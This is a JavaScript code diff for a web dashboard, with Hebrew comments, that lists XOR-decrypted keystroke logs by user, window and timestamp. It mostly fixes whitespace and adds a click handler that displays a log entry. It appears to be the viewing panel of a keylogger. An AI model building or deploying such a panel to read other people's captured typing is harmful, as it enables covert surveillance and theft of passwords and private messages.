@@ -28,10 +28,10 @@ async function fetchData() {
 
         function updateGrid(selectedUser) {
             document.querySelector('#user').innerHTML = selectedUser ? `${selectedUser}'s all data:` : 'All Users data:';
-        
+
             const filteredData = selectedUser ?
                 data.filter(entry => entry.user === selectedUser) : data;
-        
+
             const rowData = filteredData.flatMap(entry =>
                 Object.entries(entry.timestamps).map(([timestamp, value]) => ({
                     window: entry.window,
@@ -39,23 +39,23 @@ async function fetchData() {
                     logs: xorDecrypt(value)
                 }))
             );
-        
+
             if (gridApi) {
                 gridApi.setGridOption("rowData", rowData);
             }
-        
+
             // עדכון מספר ההקלדות
             document.querySelector('#keystrokeCount').textContent = rowData.length;
-        
+
             // עדכון מספר המשתמשים הפעילים (מספר המשתמשים הכולל)
             const activeUsersCount = users.length;
             document.querySelector('#activeUsers').textContent = activeUsersCount;
-        
+
             // חישוב זמן הסשן
             if (rowData.length > 0) {
                 const sessionStartTime = parseCustomTimestamp(rowData[0].timestamp);
                 const sessionEndTime = Math.max(...rowData.map(entry => parseCustomTimestamp(entry.timestamp)));
-        
+
                 if (!isNaN(sessionStartTime) && !isNaN(sessionEndTime)) {
                     const sessionDuration = Math.floor((sessionEndTime - sessionStartTime) / 60000);
                     document.querySelector('#sessionTime').textContent = `${sessionDuration}m`;
@@ -66,7 +66,7 @@ async function fetchData() {
                 document.querySelector('#sessionTime').textContent = `0m`;
             }
         }
-        
+
         const gridOptions = {
             columnDefs: [
                 { headerName: "ID", valueGetter: (params) => params.node.rowIndex + 1, flex: 1 },
@@ -79,6 +79,9 @@ async function fetchData() {
                 filter: true,
                 resizable: true,
                 headerClass: 'header-center'
+            },
+            onCellClicked: function (event) {
+                showData(event.data.logs);
             },
             rowData: [],
             pagination: true,
@@ -117,6 +120,10 @@ window.addEventListener('load', function () {
     fetchData();
 });
 
-function reload(){
+function reload() {
     window.location.reload();
+}
+
+function showData(vlaue){
+    document.getElementById('chooseLog').innerText = vlaue;
 }
